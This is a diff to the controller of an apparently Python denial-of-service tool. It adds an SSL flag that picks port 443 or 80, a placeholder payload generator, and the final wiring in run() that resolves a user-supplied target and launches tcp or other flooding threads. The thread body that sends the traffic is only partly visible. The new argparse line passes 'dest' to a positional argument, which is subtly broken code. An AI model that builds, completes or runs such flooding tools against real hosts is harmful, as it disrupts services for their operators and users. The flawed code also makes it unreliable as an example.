@@ -52,10 +52,14 @@ class Controller(Dos):
         parser.add_argument("-t", "--target", dest="target_addr")
         parser.add_argument("-m", "--mode", dest="dos_mode")
         parser.add_argument("-a", "--amount", dest="amount")
+        parser.add_argument("ssl", nargs="?", dest="ssl")
         args = parser.parse_args()
         _true = self.check_args(args)
         if _true:
-            return args.target_addr, args.dos_mode, args.amount
+            if args.ssl:
+                return args.target_addr, args.dos_mode, args.amount, args.ssl
+            else:
+                return args.target_addr, args.dos_mode, args.amount, False
 
     def check_args(self, args):
         if args.target_addr and args.dos_mode and args.amount:
@@ -68,9 +72,16 @@ class Controller(Dos):
         target_ip = socket.gethostbyname(target_addr)
         return target_ip
 
-    def out(self):
-        print(Fore.CYAN + self.banner_txt)
-        print(Style.RESET_ALL)
+    def get_port(self, ssl):
+        if ssl:
+            port = 443
+        else:
+            port = 80
+        return port
+
+    def gen_data(self):
+        data = 1
+        return data
 
     def threads(self, amount, dos_mode, data, target_ip, port):
         if dos_mode == 'tcp':
@@ -87,8 +98,11 @@ class Controller(Dos):
                 continue
 
     def run(self):
-        target_addr, dos_mode, amount = self.arguments()
+        target_addr, dos_mode, amount, ssl = self.arguments()
         target_ip = self.get_fqdm(target_addr)
+        port = self.get_port(ssl)
+        data = self.gen_data()
+        self.threads(amount, dos_mode, data, target_ip, port)
 
 if __name__ == "__main__":
     cc = Controller()
